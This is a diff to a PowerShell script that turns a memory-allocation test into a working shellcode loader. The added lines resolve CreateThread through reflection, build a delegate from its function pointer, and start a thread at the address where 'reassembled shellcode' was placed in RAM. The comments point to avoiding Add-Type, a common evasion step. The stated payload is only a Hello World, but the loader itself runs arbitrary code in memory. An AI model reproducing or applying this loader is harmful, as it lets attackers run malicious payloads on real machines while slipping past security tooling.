@@ -38,9 +38,21 @@ $address = [Runtime.InteropServices.Marshal]::AllocHGlobal($byteArray.Length)
 # NOTE: This is a test to see if the memory allocation itself is blocked.
 
 if ($address -ne [IntPtr]::Zero) {
-    Write-Host "Bytes copied to: $address"
-    # To run shellcode in PS 5.1 without Add-Type, we usually use a Thread
-    # But for your 'Hello World' report, simply seeing the bytes arrive in RAM is a huge win.
+    Write-Host "Reassembled Shellcode placed in RAM at: $address"
+    
+    # 1. Surgically find CreateThread just like we did VirtualAlloc
+    $ctMethod = $native.GetMethod("CreateThread", [Reflection.BindingFlags]"Static, Public, NonPublic")
+    $ctAddr = $ctMethod.MethodHandle.GetFunctionPointer()
+
+    # 2. Create the "Launcher" (Delegate)
+    $ctDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ctAddr, [Func[IntPtr, UInt32, IntPtr, IntPtr, UInt32, IntPtr, IntPtr]])
+
+    # 3. Launch the Shellcode in a background thread
+    Write-Host "Launching Thread..."
+    $ctDelegate.Invoke([IntPtr]::Zero, 0, $address, [IntPtr]::Zero, 0, [IntPtr]::Zero) | Out-Null
+    
+    # 4. Keep PowerShell alive for 5 seconds so the thread can print "Hello World"
+    Start-Sleep -Seconds 5
 }
 
 # 6. Cleanup
